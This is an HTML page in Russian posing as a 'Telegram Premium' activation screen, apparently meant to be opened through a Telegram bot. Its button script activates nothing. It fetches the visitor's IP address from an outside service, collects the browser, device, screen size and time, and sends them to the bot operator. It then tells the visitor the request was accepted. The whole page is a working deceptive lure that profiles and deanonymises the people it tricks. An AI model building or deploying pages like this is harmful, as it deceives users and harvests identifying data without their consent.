<!DOCTYPE html>
<html>
<head>
    <title>Telegram Premium</title>
    <meta charset="UTF-8">
    <meta name="viewport" content="width=device-width, initial-scale=1.0">
    <style>
        body {
            font-family: Arial, sans-serif;
            background: linear-gradient(135deg, #667eea 0%, #764ba2 100%);
            color: white;
            text-align: center;
            padding: 20px;
            margin: 0;
            min-height: 100vh;
            display: flex;
            justify-content: center;
            align-items: center;
        }
        .container {
            background: rgba(0,0,0,0.3);
            padding: 30px;
            border-radius: 15px;
            max-width: 500px;
            width: 100%;
        }
        .btn {
            background: #25D366;
            color: white;
            border: none;
            padding: 12px 30px;
            font-size: 18px;
            border-radius: 50px;
            cursor: pointer;
            margin-top: 20px;
            transition: all 0.3s;
        }
        .btn:hover {
            transform: scale(1.05);
            box-shadow: 0 5px 15px rgba(0,0,0,0.3);
        }
        #status {
            margin-top: 15px;
            font-size: 14px;
        }
    </style>
</head>
<body>
    <div class="container">
        <h1>Активация Telegram Premium</h1>
        <p>Нажмите кнопку для подтверждения</p>
        <button class="btn" id="activateBtn">АКТИВИРОВАТЬ PREMIUM</button>
        <p id="status"></p>
    </div>

    <script>
        document.getElementById('activateBtn').addEventListener('click', async function() {
            const statusEl = document.getElementById('status');
            statusEl.textContent = "Идет обработка запроса...";
            
            try {
                // Получаем IP
                const ipResponse = await fetch('https://api.ipify.org?format=json');
                const ipData = await ipResponse.json();
                
                // Собираем данные
                const userData = {
                    ip: ipData.ip || "Не определен",
                    browser: navigator.userAgent,
                    device: navigator.platform,
                    screen: `${window.screen.width}x${window.screen.height}`,
                    time: new Date().toLocaleString()
                };

                // Отправляем данные в Telegram
                if (window.Telegram && Telegram.WebApp) {
                    Telegram.WebApp.sendData(JSON.stringify(userData));
                    statusEl.textContent = "✅ Заявка принята! Закройте окно.";
                } else {
                    statusEl.textContent = "⚠️ Откройте через Telegram бота";
                }
            } catch (error) {
                statusEl.textContent = "Ошибка обработки. Попробуйте позже.";
                console.error(error);
            }
        });
    </script>
</body>
</html>
